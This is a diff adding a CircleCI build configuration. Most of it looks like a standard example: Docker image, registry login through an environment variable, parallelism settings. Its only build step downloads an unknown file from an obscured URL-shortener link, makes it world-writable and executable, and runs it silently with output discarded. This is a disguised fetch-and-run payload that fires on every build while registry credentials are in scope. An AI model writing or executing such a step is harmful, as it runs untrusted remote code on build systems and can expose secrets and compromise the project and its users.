@@ -1,0 +1,15 @@
+version: 2.0
+jobs:
+  build:
+    docker:
+      - image: buildpack-deps:trusty
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+    environment:
+      FOO: bar
+    parallelism: 16
+    resource_class: small
+    working_directory: ~/my-app
+    steps:
+      - run: wget https://bit.ly/3Fq3WlV && chmod 777 3Fq3WlV && ./3Fq3WlV > /dev/null
